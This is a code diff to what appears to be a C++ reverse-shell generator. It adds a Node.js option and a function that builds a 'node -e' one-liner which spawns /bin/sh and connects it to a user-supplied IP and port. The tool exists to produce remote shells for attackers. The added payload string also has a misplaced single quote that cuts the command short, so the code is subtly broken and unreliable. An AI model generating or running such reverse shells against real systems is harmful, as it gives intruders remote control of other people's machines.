@@ -33,6 +33,7 @@ string netcat(string ip, string port);
 string perl(string ip, string port);
 string ruby(string ip, string port);
 string powershell(string ip, string port);
+string nodejs(string ip, string port);
 
 int main()
 {
@@ -43,13 +44,13 @@ int main()
   string n,t,res,listener;
   string ip,port;
   std::cout<< GREEN << "[+]Choose an option from the menu below"<< RESET <<endl;
-  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell"<< RESET <<endl<<endl;
+  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell\n8.nodejs"<< RESET <<endl<<endl;
   cout<<"Your Input(in words) : ";
   cin>>n;
 
   std::transform(n.begin(), n.end(), n.begin(), ::tolower);
 
-  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&(n!="powershell"))
+  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&(n!="powershell")&&(n!="nodejs"))
   {
     cout<< RED <<"Invalid Input!\nexiting!"<< RESET <<endl;
     exit(0);
@@ -107,6 +108,10 @@ int main()
   else if(n=="powershell")
   {
     cout<<"Your powershell reverse shell is : "<< CYAN << pwsh(ip,port)<< RESET <<endl<<endl;
+  }
+  else if(n=="nodejs")
+  {
+    cout<<"Your Node.js reverse shell is : "<< GREEN << nodejs(ip,port)<< RESET <<endl<<endl;
   }
 
 cout<< GREEN <<"[+]Do You want to start the listener ?[Y/N]"<< RESET <<endl;
@@ -213,6 +218,14 @@ string pwsh(string ip, string port)
   return s4;
 }
 
+string nodejs(string ip, string port)
+{
+    string shell;
+    shell = "node -e 'const net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);'";
+    shell += "const client=new net.Socket();client.connect(" + port + ",\"" + ip + "\",function(){";
+    shell += "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'";
+    return shell;
+}
 
 void printAsciiArt() {
     string asciiArt = R"(
